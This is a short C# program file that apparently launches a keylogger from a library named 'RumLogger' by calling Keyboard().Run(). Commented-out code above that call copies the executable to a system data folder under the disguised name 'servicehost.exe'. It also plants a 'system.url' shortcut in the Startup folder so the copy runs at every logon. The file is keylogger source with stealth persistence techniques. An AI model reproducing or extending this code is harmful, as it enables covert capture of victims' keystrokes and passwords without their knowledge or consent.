using System;
using System.Diagnostics;
using System.IO;
using RumLogger;

Trace.Listeners.Add(new ConsoleTraceListener());

//var proc = Process.GetCurrentProcess();
//var currentPath = proc.MainModule.FileName;
//var currentFile = new FileInfo(currentPath);
//var currentFolder = currentFile.Directory;

//var targetName = "servicehost.exe";
//var targetPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), targetName);
//var targetFile = new FileInfo(targetPath);
//var targetFolder = targetFile.Directory;

//if (currentPath == targetPath)
//{
//    Trace.WriteLine("Application in final folder");
//}
//else
//{
//    Trace.WriteLine($"Copying to {targetPath}");
//    currentFile.CopyTo(targetPath);

//    var deskDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
//    using var writer = new StreamWriter(deskDir + "\\" + "system.url");

//    var app = System.Reflection.Assembly.GetExecutingAssembly().Location;
//    writer.WriteLine("[InternetShortcut]");
//    writer.WriteLine("URL=file:///" + targetPath);
//}

var k = new Keyboard();
k.Run();
